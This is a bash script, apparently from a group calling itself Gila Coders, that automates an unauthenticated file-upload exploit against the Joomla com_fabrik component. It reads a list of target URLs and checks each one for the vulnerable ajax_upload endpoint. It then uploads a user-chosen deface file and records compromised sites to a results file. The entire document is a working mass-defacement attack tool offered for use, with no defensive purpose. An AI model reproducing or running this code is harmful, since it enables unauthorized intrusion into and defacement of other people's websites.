#!/usr/bin/env bash
# Auto Exploit Com_Fabrik
#Gila_Coders
clear
green='\033[1;32m'
red='\033[1;31m'
cyan='\033[1;36m'
white='\033[1;37m'
NC='\033[0m'
useragent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/56.0";

printf "${green}Auto Exploit Com_Fabrik\n"
printf "${white}Blog : ${white} http://gilacoders.blogspot.com\n"
printf "${cyan}Code : Bash\n"
printf "${white}GILA ${green}CODERS\n"
printf "${NC}\n"
echo -e '\e[1;36m' ""
echo -n "NAME FILE LIST : "; read list
echo -n "NAME FILE DEFACE : "; read fdepes
jem=$list
#printf
while domath= read -r url
do 

function checking() 
{
	ngecheck=$(curl -q --connect-timeout 5 -X POST ${1}"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload" 2>&1 | egrep -o "filepath" );
		if [ "filepath" == "${ngecheck}" ]; then
		printf ${white};
			echo "[VULN] - $url";
		printf ${cyan};
			echo "[SEDANG DALAM PROSES DEFACE]"
				curl -q --silent $useragent --connect-timeout 10 -X POST -F file=@${fdepes} "${var}/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload" 2>&1
		  printf ${NC};
	    printf ${green};
	 		echo "[BERHASIL] => $url/${fdepes}" | tee -a hasil.txt
	 	printf ${NC};
	 	else
	 	printf ${red};
			echo "[GAGAL] - $url";
		printf ${NC};
fi
}
checking $url

done < "$jem";